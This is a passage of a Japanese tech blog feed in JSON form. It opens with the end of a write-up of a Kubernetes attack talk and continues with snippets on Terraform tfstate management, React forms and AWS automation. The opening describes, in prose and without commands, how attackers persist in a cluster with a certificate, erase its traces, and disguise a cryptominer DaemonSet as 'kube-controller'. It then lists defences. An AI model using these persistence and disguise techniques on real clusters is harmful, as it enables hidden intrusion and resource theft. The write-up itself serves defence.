の証明書を作成し、クラスタへの侵害を永続化証明書作成の痕跡を削除興味深い点として、クリプトマイナーを設置する際に ClusterRoleBinding と DaemonSet を作成しますが、リソース名を kube-controller とすることで正規のリソースを偽装しています。運用業務でクラスタ内のリソースを確認したとしても、クリプトマイナーの存在に気づかないかもしれません。リポジトリも kubernetesio/~ のように偽装しています。また今回はCSRを削除していますが、cluster-admin を持っていれば、クラスタ内で行われる検知の回避や防御の無効化も容易にできてしまいます。クラスタとは別のレイヤーで、監査ログの監視などを行う必要があるかもしれません。パブリッククラウドを利用する場合、クラスタ内のセキュリティ対策とクラウド上の監視サービスを併用するのが良さそうです。セッション後半では、取るべきセキュリティ対策について紹介しています。Kubernetes API Server へのアクセスのネットワーク制限--anonymous-auth=false による匿名リクエストを無効化アドミッションコントローラーによる cluster-admin のバインディング禁止検知策として、設定ミスの検知Kubernetes API への攻撃の検知マイニングの検知のそれぞれ3つの対策が挙げられています。設定ミスの対策では、system:anonymous や system:authenticated に付与された権限がないか確認するためのスクリプトが紹介されています。Kubernetes の監査ログを監視することも有効です。Google Cloud の Security Command Center (SCC) には脅威検知の機能がありますが、この機能を利用すれば GKE に対する設定ミスや攻撃を検知できます。(発表者は Google Cloud の方です)マイニングの検知について、IoC (Indicator of Compromise) を利用する方法がセッション内では紹介されています。既知のマルウェアコンテナや悪意のあるバイナリ、攻撃サーバのIPアドレス等と照合することで攻撃を検知します。SCC におけるマイニング検知のベストプラクティスも興味があれば読んでみてください。おわりにいかがだったでしょうか？Kubernetes への攻撃手法を知ることは、(それ自体面白いというのもありますが) リスクベースのセキュリティ対策を検討する上で非常に有用です。このセキュリティ対策はどのような攻撃リスクを軽減してくれるのかこの攻撃が行われた場合、どのセキュリティ対策によって防ぐことができるのかといった観点で考えてみることをお勧めします。Kubernetes クラスタを目指して、皆で取り組んでいきましょう。","isoDate":"2023-12-30T19:07:20.000Z","dateMiliSeconds":1703963240000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"フォームライブラリに依存しないReactコンポーネント設計","link":"https://zenn.dev/kimitsu/articles/clean-react-form-architecture","contentSnippet":"背景React ではフォームライブラリを利用する場合、ナイーブに実装するとフォームの UI とフォームライブラリが密結合になります。これは特定のフォームライブラリに限った話ではなく、React Hook Form, Formik, React Final Form といった主要なフォームライブラリ全てで当てはまる問題です。例えば React Hook Form では、フォーム全体の設定をuseFormで行い、各属性ではregister, Controller, useControllerを使って UI と React Hook Form を接続します。つまりフォームコンポーネ...","isoDate":"2023-12-30T06:07:24.000Z","dateMiliSeconds":1703916444000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Step Functionsを利用してNAT Gatewayを自動作成/削除する","link":"https://qiita.com/ys1/items/abf8daab19f616b3d854","contentSnippet":"概要本記事ではStep Functionsを利用して、Nat Gatewayを自動で作成/削除する方法について記載します。NAT Gatewayは作成しているだけでコストがかかるリソースであり、…","isoDate":"2023-12-29T15:25:41.000Z","dateMiliSeconds":1703863541000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"パフォーマンスを気にするならReact Hook Formが無難","link":"https://zenn.dev/kimitsu/articles/react-form-library-performance","contentSnippet":"最近、React のフォームライブラリを調査しました。その中でパフォーマンスについての言及は見かけるものの、実際に計測しているものが見当たらなかったので計測してみました。結論としては React Hook Form でなくても良いけど、パフォーマンスを気にするなら React Hook Form を選んでおくのが無難というところに落ち着きました。 要約入力欄 10 個、CPU 6\xd7 slowdown での計測結果ライブラリ1 文字入力した場合の再描画React Hook Form8ms 前後Formik100ms 前後Formik（<F...","isoDate":"2023-12-29T14:00:56.000Z","dateMiliSeconds":1703858456000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"K8sGPT: Log Analyzer","link":"https://zenn.dev/tozastation/articles/3e2b9e887639f4","contentSnippet":"Filter 一覧➜  k8sgpt filters listActive:> ReplicaSet> PersistentVolumeClaim> Service> StatefulSet> Node> Pod> Deployment> Ingress> CronJob> ValidatingWebhookConfiguration> MutatingWebhookConfigurationUnused:> HTTPRoute> HorizontalPodAutoScaler...","isoDate":"2023-12-28T08:26:54.000Z","dateMiliSeconds":1703752014000,"authorName":"tozastation","authorId":"tozastation"},{"title":"K8sGPT: 概要","link":"https://zenn.dev/tozastation/articles/737871319fb33b","contentSnippet":"K8sGPT とはIt has SRE experience codified into its analyzers and helps to pull out the most relevant information to enrich it with AI.README.md, k8sgpt, https://github.com/k8sgpt-ai/k8sgptREADME.md の引用ですが、SRE Experience が Analyzerに体系化されており、最も関連性の高い情報を引き出してAIで補完するのに役立つと書かれています。 SRE Experien...","isoDate":"2023-12-28T07:16:37.000Z","dateMiliSeconds":1703747797000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Neovimで文法に従ってコードを範囲選択するtreemonkey.nvimを作った","link":"https://blog.atusy.net/2023/12/27/treemonkey-nvim/","contentSnippet":"treemonkey.nvimというプラグインを作りました。treesitterを活用し、カーソル位置に対応するノード（変数とか関数とか）を選択するプラグインです。ノードの開始位置と終了位置に対応するラベルがあるので、自分が選択したい範囲に対応するラベルを選ぶ形式です。","isoDate":"2023-12-27T00:00:00.000Z","dateMiliSeconds":1703635200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Kubernetesのソースコードを読む Kubelet編","link":"https://qiita.com/ys1/items/7a455c602424e591fe38","contentSnippet":"起動処理Kubeletの起動処理についてソースコードを追っていき、どんな処理をしているのかみていきたいと思います。読むソースコード: バージョン: v1.27.2https://github.…","isoDate":"2023-12-25T15:06:41.000Z","dateMiliSeconds":1703516801000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"GitHub Actions で cosign を使って keyless 署名する","link":"https://qiita.com/yteraoka/items/db13b1dd94fa9e115676","contentSnippet":"この記事は、3-shake Advent Calendar 2023 24日目のエントリ記事です。Container image が適切な方法で build されたものかどうかを確認するために署名…","isoDate":"2023-12-24T14:16:16.000Z","dateMiliSeconds":1703427376000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Terraformのtfstateについて考える","link":"https://blog.masasuzu.net/entry/2023/12/23/000000","contentSnippet":"この記事は3-shake Advent Calendar 2023の23日目の記事となります。3-shakeのカレンダー | Advent Calendar 2023 - QiitaこちらはSRE Tech Talk #6で話した内容に補足したものです。3-shake SRE Tech Talk #6 - connpass資料はこちらとなります。    tfstateとはtfstateの課題tfstateの管理場所をどうするか問題localS3/Google Cloud StorageGitLabTerraform Cloudtfstateを管理するリソースをどう管理する問題aws/gcloud コマンドterraform + local state 管理CloudFormation / Google Deployment Managertfstateをどう分割するか問題環境分離パターンディレクトリ分離パターンbackend-configパターンworkspace環境分離以外の分割をどうするか問題分割する観点プロバイダーで分割管理権限で分割変更頻度で分割依存の方向性で分割tfstate間のリソース参照まとめtfstateとはTerraformが管理しているリソースの状態を表すjson形式のファイルです。tfstateとterraformファイルと実際のリソースの状態を比較して、terraformコマンドが実行されます。一般的には直接変更せずterraform stateコマンドを通して変更を行い、一般ユーザがtfstateに触れることはないです。参考: Backend Configuration - Configuration Language | Terraform | HashiCorp Developertfstateの課題tfstateについて以下の課題があります。それぞれについて見ていきます。tfstateの管理場所tfstateを管理するリソースの管理tfstateの分割tfstateの管理場所をどうするか問題主な保存場所候補としては以下のものがあります。local(デフォルト)クラウドのオブジェクトストレージS3/Google Cloud StorageGitレポジトリ統合GitLabSaaS利用Terraform CloudlocalTerraformのデフォルト保存先です。Terraformを実行する同じディレクトリのterraform.tfstateに保存されます。1人もしくは変更頻度が著しく低い状況など特殊なとき使えるものとなります。git管理して複数人で使うこともできるが、コンフリクトが発生しうるので、チーム開発には向かないです。基本的には複数人でterraformを使用するときは非推奨です。参考: Backend Type: local | Terraform | HashiCorp DeveloperS3/Google Cloud Storage監理するクラウドのオブジェクトストレージに保存する方法です。これが標準的(当社比)なのかなと思っています。オブジェクトストレージなので、権限があればどこからでもアクセスすることができます。それゆえ、同時にTerraformが実行されるので排他ロックの処理が必要となります。S3バックエンドを使用した場合はDynamoDBを使用してstate lockを実現します。Google Cloud Storageは単体でstate lockをサポートしています。tfstateの参照権限をクラウドのIAMで制御する必要があります。参考: Backend Type: s3 | Terraform | HashiCorp Developer参考: Backend Type: gcs | Terraform | HashiCorp DeveloperGitLabGitLabでtfstateを監理することもできます。tfstateを管理するリソースを管理する必要がないことがメリットとなります。(後述します)開発にGitLabを使っている場合、親和性が高い方法となります。参考: GitLab-managed Terraform state | GitLabTerraform CloudGitLabと同様tfstateを管理するリソースを管理する必要がないというところにメリットがあります。月間500 Managed Rsourcesまで無料で使えます。参考: HashiCorp Terraform: Enterprise Pricing, Packages & Featuresweb上からリソース差分の確認できたり、applyが可能です。SaaSにクラウドのリソース情報を預けることに抵抗がない場合は選択肢としては有望です。なおTerraformのStateのドキュメントではこういう記述があり、Terraform Cloudを推奨しているようです。This state is stored by default in a local file named \\"terraform.tfstate\\", but we recommend storing it in Terraform Cloud to version, encrypt, and securely share it with your team.参考: State | Terraform | HashiCorp Developer昔はAWSと連携するためにIAM Userのアクセスキーを使わないといけなかったが、OIDC認証もできるようになったので、よりやりやすくなったかと思います。参考: Terraform Cloud Adds Dynamic Provider Credentials for Vault and Official Cloud Providers参考: Terraform Cloud | Terraform | HashiCorp Developertfstateを管理するリソースをどう管理する問題GitLabやTerraform Cloudを使う場合には起きない問題となります。S3のようなクラウドのオブジェクトストレージを使用する場合は、このS3バケットをどう作るかということが問題となります。コマンドで作る場合、コマンドの管理、terraformで作る場合はそのtfstateはどこに保存するか、そういったことに頭を悩ませます。そこについて考えていきます。以下の方法が考えられます。aws/gcloudコマンドterraform + local state管理CloudFormationaws/gcloud コマンドそもそも作成コマンドしか打たないのであれば、スクリプトをレポジトリに含めておけば良いという考え方はあります。基本的に一度作れば変えることはないので、これで十分という風に割り切ることはできます。ただし、tfstateのバケットだけでなく、CI/CD用のIAM RoleやOIDC認証リソースなども初期リソースとして含めて管理したいというユースケースだと、スクリプト管理では力不足になりうります。terraform + local state 管理オブジェクトストレージをterraformで作る方法です。ただし、tfstateに関してはlocalに保存し、これをgitも管理します。かたくなにterraformを使いたい人に向けな方法となります。デメリットとしては、tfstateもgit管理するのでコミット忘れがあります。また、頻度低いですがterraform自体はローカルで実行せざるを得ないので変更衝突が起きうることです。CloudFormation / Google Deployment Managerクラウドごとにコードを変えないといけない。IaCツールを2種類使うというそこはかとない気持ち悪さはあるというデメリットはありますが、gitでインフラ状態管理しなくてすむというメリットがあります。気持ち悪さだけを克服できるなら無難な選択肢だとは思います。tfstateをどう分割するか問題第一に考えるのが環境の分離。この分離の仕方だけ他とは系統が違うので独立して説明します。一部差分があるだけで、以下のような形でほぼ同じ構成の環境を作ることはよくあります。開発環境ステージング環境本番環境これらについてどう分割するのかを考えていきます。環境分離パターン大きく2つのパターンを利用することが多いです。それぞれ見ていきます。ディレクトリ分離パターンbackend-configパターンディレクトリ分離パターンこれは環境ごとにディレクトリを分割して、環境ディレクトリを実行単位とします。環境の切り替えはディレクトリ移動することで行います。環境ごとの差分が大きいときに使うことが多いです。デメリットとしては環境ごとにリソース定義をそれぞれ書くので記述量が多くなるというのがあります。そのため、可能な限りモジュール化して、なるべくパラメータだけの差分にするようにします。ディレクトリ構成例としては以下の通りです。.├── envs│   ├── dev│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   ├── prd│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   └── stg│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf└── modules    ├── vpc    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tf    ├── application    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tfbackend-configパターンbackend-configオプションとvars-fileオプションを組み合わせて、環境を切り替えるパターンです。${ENVDIR}/terraform.tfvars に環境ごとの差分パラメータを定義して、${ENVDIR}/backend.tfvars に環境ごとのtfstate保存先を定義します。terraform init で backend.tfvars を切り替えることで環境の切り替えを行います。環境ごとに差分が少ないときに向いています。差分は terraform.tfvars に記述されているパラメータだけなので、記述量が少なくて済みます。ただし差分が多くなるとcount, for_eachで分岐やループを作ることになり読みにくくなるというものがあります。ディレクトリ構成例としては以下のようになります。.├── envs│   ├── dev│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   ├── prd│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   └── stg│       ├── backend.tfvars│       └── terraform.tfvars├── locals.tf├── main.tf├── modules│   └── vpc│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf├── outputs.tf├── provider.tf└── variables.tf設定ではbackendをs3と指定しておき中身はオプションで指定するようにします。terraform {  backend \\"s3\\" {}}以下のようにterraform initするたびに適用する環境を切り替えることができる。terraform init --backend-config=${ENVDIR}/backend.tfvars --reconfigureterraform apply --var-file=${ENVDIR}/terraform.tfvarsworkspaceworkspaceは同じような環境を複製するときに使ういます。シングルテナント環境を量産する場合や開発環境を複数作る場合などに使います。環境を切り替える用途には作られてないとドキュメントまでは記載されています。参考: Managing Workspaces - Terraform CLI | Terraform | HashiCorp DeveloperIn particular, organizations commonly want to create a strong separation between multiple deployments of the same infrastructure serving different development stages or different internal teams. In this case, the backend for each deployment often has different credentials and access controls. CLI workspaces within a working directory use the same backend, so they are not a suitable isolation mechanism for this scenario.自分自身がworkspaceを実運用で使ったことがないので多くは語れないです。別でちゃんと使ってから書きたいと思います。参考: State: Workspaces | Terraform | HashiCorp Developer環境分離以外の分割をどうするか問題小さいサービスでは環境を分離するだけでだいたいは問題ないことがおおいですが、terraformを運用していると運用面、管理面でいろいろ課題が出てくると思います。管理するリソースが増えるとplan/applyの時間が増えたり、リソースの見通しが悪くなったりしてきます。特に実行時間が意外に馬鹿にできなかったりします。下手するとplanに数分かかるようになったりします。そのため、ある程度大きくなったらtrstateを分割して、リソースの管理範囲を分割する必要が出てきます。これをどうやって分割するかが自分の中で答えが出ていない出てないし、分脈によって解決策は異なるとは思います。ここで、解決策を考えるうえで、分割するための観点を見ていきましょう。分割する観点分割する観点は以下のようなものがあるかと思います。プロバイダー管理権限変更頻度プロバイダーで分割プロバイダー単位で分割するパターンです。例としてはAWSとDatadogのようにプロバイダーで分割します。プロバイダー間で依存がない場合は分けやすいかと思います。また、プロバイダー間で管理主体が違うことも多いので素直な分け方だとは思います。しかしながら、アプリケーションリソースとアプリケーションの監視を近いところにおいたほうが見通しがよいのではという観点もあるので運用体制にあわせて考えるとよいでしょう。管理権限で分割チームの権限で分割するパターンです。ただし、より堅くするなら、ディレクトリではなくレポジトリ自体も分割して、コードの参照権限も分割する方が望ましい場合もあります。例ネットワーク ⇒ インフラチームアプリケーション ⇒ 開発チーム変更頻度で分割変更をあまりしないリソースを変更が頻繁なリソースと一緒のplan/applyするのは無駄なので変更の頻度でtfstateを分割するパターンもあります。例変更が少ない ⇒ DB/ネットワーク変更が多い ⇒ EC2/ECS依存の方向性で分割少し観点を変えてみます。実際に分割をした場合に問題となるのはtfstate間のリソースの依存が課題になります。tfstate間で相互に依存するようなコードを書くとtarget指定してそれぞれのstateのリソースを作成しなくてはなりません。こうすると管理が煩雑となってしまうので、原則的に片方向だけの依存になるように分割するようにするのが望ましいです。tfstate間のリソース参照terraform_remote_state を使うことで、参照元のTerraformでoutputした内容を別のTerraformで利用することができます。# 参照元 networkアカウントoutput \\"vpc_id\\" {  value = aws_vpc.main.id}# 参照先 applicationアカウント# data.terraform_remote_state.network.vpc_id の形式でVPC IDを参照できるdata \\"terraform_remote_state\\" \\"network\\" {  backend = \\"s3\\"  config {    bucket = \\"terraform-tfstate-network-xxxxx\\"    key    = \\"tfstate\\"    region = \\"ap-northeast-1\\"  }}まとめ正直tfstateをどう扱うかに正解はないです。サービス規模や性質によって選択は変わります。本当に小さい規模であれば、tfstateを分割せず一つで十分でしょうし、チーム開発せず一人で扱うなら、通常であれば推奨されないtfstateのlocal git管理という手段がふさわしい場合もあります。また、組織やサービスの成長や時間経過によっても最適な選択は変わると思います。大事なのは選んだ技術要素に関しては選定理由を説明できるようにはしておくということです。選定理由及び不採用理由を明確にしておくことで、変更時に最適な選択の助けになるでしょう。","isoDate":"2023-12-22T15:00:00.000Z","dateMiliSeconds":1703257200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"testcontainers-scala で快適なインテグレーションテストを実現する","link":"https://zenn.dev/nomadblacky/articles/173ea1f829eafa","contentSnippet":"この記事は、3-shake Advent Calendar 2023 の 22 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。 課題Reckoner では、データの取得・加工・保存部分を Scala で実装しており、データの連携先として、MySQL ...","isoDate":"2023-12-22T13:07:06.000Z","dateMiliSeconds":1703250426000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"AWS Network Firewall と NAT ゲートウェイの配置","link":"https://zenn.dev/toshikish/articles/d7d15cd01a8584","contentSnippet":"はじめにAWS Network Firewall（以下 NWFW）の導入例を探してアーキテクチャ図を眺めていると，説明されている図によって NAT ゲートウェイ（以下 NATGW）との配置がまちまちであることに気づきます。つまり，プライベート・パブリックサブネットのシンプルな構成の場合，インターネット宛ての通信経路は大別するとプライベートサブネット→ NATGW→ NWFW →インターネットプライベートサブネット→ NWFW → NATGW →インターネットの2種類が存在します。それぞれのアーキテクチャの違いと，どちらを選定すべきかの指針についてまとめます。 1....","isoDate":"2023-12-22T07:17:39.000Z","dateMiliSeconds":1703229459000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Kubernetesに対する理解を高めてKubernetesの「わからない」を減らそう","link":"https://speakerdeck.com/bells17/kubernetesnidui-suruli-jie-wogao-metekubernetesno-wakaranai-wojian-rasou","contentSnippet":"Kubernetes Novice Tokyo #29 で発表したLT資料です\\r\\rイベントURL: https://k8s-novice-jp.connpass.com/event/300438/\\r動画URL: https://www.youtube.com/watch?v=WZHDlB8P9_4\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.4 \\rhttps://github.com/coredns/coredns/tree/v1.11.1 \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin/kubernetes/README.md \\rhttps://github.com/kubernetes/dns/blob/1.22.28/docs/specification.md \\rhttps://github.com/kubernetes/cri-api/blob/v0.28.4/pkg/apis/runtime/v1/api.proto \\rhttps://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/\\rhttps://coredns.io/2016/12/19/writing-plugins-for-coredns/ \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin.md  \\r\\rセッション内容の詳しい資料:\\rhttps://bells17.booth.pm/items/3129761\\rhttps://bells17.booth.pm/items/2649601\\rhttps://speakerdeck.com/bells17/implementation-of-kubeadm-init\\rhttps://speakerdeck.com/bells17/kube-api-server-k8sjp\\rhttps://speakerdeck.com/bells17/kube-controller-managerru-men\\rhttps://speakerdeck.com/bells17/kube-proxyru-men\\rhttps://speakerdeck.com/bells17/kubernetestocorednsnituiteli-jie-suru\\rhttps://speakerdeck.com/bells17/cloud-controller-manager-deep-dive\\rhttps://speakerdeck.com/bells17/introduction-to-csi\\rhttps://speakerdeck.com/bells17/kubelet-and-containers\\rhttps://speakerdeck.com/bells17/cri-spec-and-dockershim-implementation","isoDate":"2023-12-21T05:00:00.000Z","dateMiliSeconds":1703134800000,"authorName":"bells17","authorId":"bells17"},{"title":"\uD83D\uDC19 KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","link":"https://speakerdeck.com/hiroki_hasegawa/kubernetesnomarutitenantopatantoargocdnoshi-jian-tenantoshe-ji","contentSnippet":"『Kubernetes Novice Tokyo』の登壇資料です\\r\\r・Kubernetesのマルチテナントパターンの種類\\r・ArgoCDのAppProjectテナントとNamespacedスコープモード\\r・ArgoCDのテナントが防いでくれる誤った操作の具体例\\r\\rを紹介しました\\r\\rArgoCDのマニフェストの実装例を解説できませんでしたので、ぜひ元記事 (KubernetesのマルチテナントパターンとArgoCDの実践テナント設計) もご参照ください\uD83D\uDC4D\uD83C\uDFFB\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1737778249021952458","isoDate":"2023-12-21T05:00:00.000Z","dateMiliSeconds":1703134800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"【ArgoCD\uD83D\uDC19】\\"Kubernetes Novice Tokyo\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/12/21/833414","contentSnippet":"発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類ArgoCDのAppProjectテナントとNamespacedスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例発表スライドから得られる知識イベント名発表スライドイベント名オッス！オラ長谷川！✋\uD83C\uDFFB『KubernetesのマルチテナントパターンとArgoCDの実践テナント設計』ていうテーマで、 Kubernetes Novice Tokyo に登壇したぞ！https://k8s-novice-jp.connpass.com/event/300438/発表スライドみんな！スライドぜってぇ見てくれよな！Kubernetes Novice Tokyo の登壇資料です！キミだけの最強のマルチテナントを作ろう✌️#k8snovicehttps://t.co/qNEhnkA7WZ— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) December 21, 2023 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2023-12-21T03:00:00.000Z","dateMiliSeconds":1703127600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"ddc.vimを使ってmakeやGinなどのExコマンドの補完を実現する","link":"https://blog.atusy.net/2023/12/20/ddc-fish-alias-completion/","contentSnippet":"ddc.vimは自動補完プラグインの1つです。新世代の自動補完プラグイン ddc.vimコマンドライン補完にも対応しており、組込みの補完よりも補完候補のソースやマッチング、ソーティングにおいて、高い柔軟性を持ちます。","isoDate":"2023-12-20T00:00:00.000Z","dateMiliSeconds":1703030400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"テーブル構造変更に伴う認可・権限管理を設計実装してみて思ったこと","link":"https://qiita.com/bayobayo0324/items/a2fcc5eee9930bd2009a","contentSnippet":"※この記事は3-shake Advent Calendar 2023の20日目の記事ですはじめまして、@bayobayo0324 です。株式会社スリーシェイクでクラウド型データ連携ツール「Rec…","isoDate":"2023-12-19T22:00:39.000Z","dateMiliSeconds":1703023239000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"RでR言語をパースする","link":"https://blog.atusy.net/2023/12/19/r-parsed-data/","contentSnippet":"R言語 Advent Calendar 2023の19日目の記事です。ggplot2で標準偏差付きの折れ線グラフを描く」でした。可視化大事。2023年、ずいぶんとRを触ることが減りました。ftExtraなどのパッケージの更新をほそぼそとやってます。","isoDate":"2023-12-19T00:00:00.000Z","dateMiliSeconds":1702944000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"terraform test: 細かい挙動","link":"https://zenn.dev/kyohei_saito/articles/eac62818b7217d","contentSnippet":"この記事は 3-shake Advent Calendar 2023 19 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能terraform test: 細かい挙動 <- 今ここ はじめに前回の記事では、 terraform test の応用的な機能の紹介をしました。この記事では、 terraform test の挙動について説明します。 terraform test: 細かい挙動 state...","isoDate":"2023-12-18T14:58:00.000Z","dateMiliSeconds":1702911480000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesとCoreDNSについて理解する","link":"https://speakerdeck.com/bells17/kubernetestocorednsnituiteli-jie-suru","contentSnippet":"3-shake SRE Tech Talk #8 で発表したLT資料です\\r\\rイベントURL: https://3-shake.connpass.com/event/302755/\\r動画URL: https://www.youtube.com/watch?v=8JbfniqxNQk\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.4 \\rhttps://github.com/coredns/coredns/tree/v1.11.1 \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin/kubernetes/README.md \\rhttps://github.com/kubernetes/dns/blob/1.22.28/docs/specification.md \\rhttps://github.com/kubernetes/cri-api/blob/v0.28.4/pkg/apis/runtime/v1/api.proto \\rhttps://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/\\rhttps://coredns.io/2016/12/19/writing-plugins-for-coredns/ \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin.md","isoDate":"2023-12-18T05:00:00.000Z","dateMiliSeconds":1702875600000,"authorName":"bells17","authorId":"bells17"},{"title":"2023-12-18 SRETT8 Terraform使いがPulumiに入門する","link":"https://speakerdeck.com/masasuzu/2023-12-18-srett8-terraformshi-ikapuluminiru-men-suru","contentSnippet":"","isoDate":"2023-12-18T05:00:00.000Z","dateMiliSeconds":1702875600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"VimのOperator待機モードでexclusive motionをinclusiveに使う","link":"https://blog.atusy.net/2023/12/18/vim-convert-exclusive-motions-into-inclusive/","contentSnippet":"Vimアドベントカレンダー2023の12/18の記事です。ryoppippiさんによる「Vimで人生が豊かになった話」(2023/12/18 22:25時点で未投稿)atusyによる「Vimで無名レジスタでchange/delete/yankした時に、イニシャルに相当するレジスタにも値を入れる」Vimのモーションのinclusive/exclusive、なかなか意識する場面が少ないですね。","isoDate":"2023-12-18T00:00:00.000Z","dateMiliSeconds":1702857600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"terraform test: 応用機能","link":"https://zenn.dev/kyohei_saito/articles/52ce184522aae9","contentSnippet":"この記事は 3-shake Advent Calendar 2023 18 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能 <- 今ここterraform test: 細かい挙動 はじめに前回の記事では、 terraform test の基本的な機能の紹介をしました。前回の記事の内容でも十分に terraform module のテストを書くことができると思います。しかし、今回紹介する応用的な機能を使...","isoDate":"2023-12-17T14:58:00.000Z","dateMiliSeconds":1702825080000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"AWS Step Functionsを利用してAWSリソースの自動起動停止を行う","link":"https://qiita.com/ys1/items/21744f39676286b2c321","contentSnippet":"概要本記事ではStep Functionsを利用して、AWSリソースを自動で起動停止する方法について記載します。主にコスト削減のために、開発環境を夜間停止するなどで利用することを想定しています。今回は以下のようなことを実施する方法について説明しま…","isoDate":"2023-12-17T14:55:57.000Z","dateMiliSeconds":1702824957000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"個人開発で要件定義、設計をした話","link":"https://kechigon.hatenablog.com/entry/2023/12/17/142140","contentSnippet":"現在、個人開発で麻雀戦績管理アプリを作っていて、要件定義や設計について考えたことを共有したいと思います。GitHub ↓github.comなぜやったのか自分はWebエンジニアを目指している大学生ですが、まともなWebアプリを開発した経験がなく、フロントからインフラまでフルスタックで開発しようと思い立ちました。最初は何をするか手探りの状態でしたが、その「何をするのか」を定義するために要件定義、設計から始めました。何をやったのかGitHubにissueを作成し、やるべきことを明確化していきました。要件定義ここではアプリケーションの機能や、なぜそのような機能にするのかを箇条書きしていきます。この作業を通してやることとやらないことが明確化され、実装もうっすら浮かんできます。実際の要件定義は以下のような感じになりました。- ユーザーはまずサインアップする   - ユーザー名、パスワードを設定する      - ユーザー名は一意でないといけない   - ユーザの削除機能はデータ整合性が複雑になるので作らない - サインアップ済みのユーザーはログインをする   - ユーザー名、パスワードを入力- セッション管理をし、セッションが張られていたらログインを省略し、ユーザーホーム画面に入る。- 親ユーザーが部屋を作り、他のユーザーを登録していく   - 作成できる部屋は10部屋まで   - 親は参加のためのパスワードを設定する   - 子は親に部屋IDとパスワードを共有してもらう   - 3人以上いないと対局結果は登録できない、四麻は四人   - 部屋の削除機能も必要- 各部屋のホーム画面では各部屋での自分の戦績が表示される- オフラインで対局した点数結果とそのユーザーと何家かをアプリに登録する   - 点数結果だけでいいの？      - 毎回上がり役とかを登録してると、面倒くさいと思う   - 三麻も登録できるようにする。   - 点数の合計点を計算し、ユーザーの入力をチェックする   - 同点の場合は、東寄りが上位- 取り消し機能も必要   - 「対局」という粒度で削除できるようにする。これは点数とユーザを登録したひと塊。      - 間違えてもその「対局」を消し、また新しい「対局」を作ればいい - 自分または同じ部屋のユーザーの成績を確認できるようにする    - 平均順位   - 一位率   - 二位率   - 三位率   - 四位率   - とび率   - 対局数   - 平均得点   - 各項目のランキングも出す   - 「n局以上」で検索できるようにする- 対局の登録、削除のたびに個人成績を計算しなおすデータベース設計ER図を書きます。要件定義にあるように今回のアプリではユーザーのログイン機能や、そのユーザーが作成、参加する部屋、その部屋ごとの戦績など、テーブルが複雑にリレーションを張るので設計に入る前に整理することができます。ある程度機能を盛り込む予定の個人開発では必須でしょう。画面遷移画面遷移図を書きます。ページとその機能、ページ同士の遷移を定義します。ここで定義したことはすなわちユーザーアクションのすべてなので、ユーザーアクションごとのテストがしやすくなります。実際の画面遷移図↓以上のような要件定義、設計を行うことで、実装での手戻りが少なくなり、快適に実装ができました。これからアプリケーション自体はほとんど完成しているので、コンテナ化し、それをECSやCloud Runにデプロイし、運用していく予定です！","isoDate":"2023-12-17T05:21:40.000Z","dateMiliSeconds":1702790500000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"Vimで無名レジスタでchange/delete/yankした時に、イニシャルに相当するレジスタにも値を入れる","link":"https://blog.atusy.net/2023/12/17/vim-easy-to-remember-regnames/","contentSnippet":"Vim Advent Calendar 